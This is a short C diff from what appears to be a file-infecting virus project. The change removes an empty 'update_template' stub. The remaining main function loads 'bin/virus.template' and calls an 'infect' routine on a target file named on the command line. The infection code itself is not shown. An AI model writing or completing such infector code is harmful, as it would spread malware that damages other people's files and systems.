@@ -14,17 +14,11 @@ int usage(char *name){
 	return -1;
 }
 
-void update_template(char *t, size_t n){
-	//add a few information about himself
-	//TODO
-}
-
 int main(int ac, char **av){
 	if (ac < 2){
 		return usage(av[0]);
 	}
 	char *template; size_t n;
 	fget("bin/virus.template", &template, &n);
-	update_template(template, n);
 	return infect(av[1], template, n) == FALSE;
 }
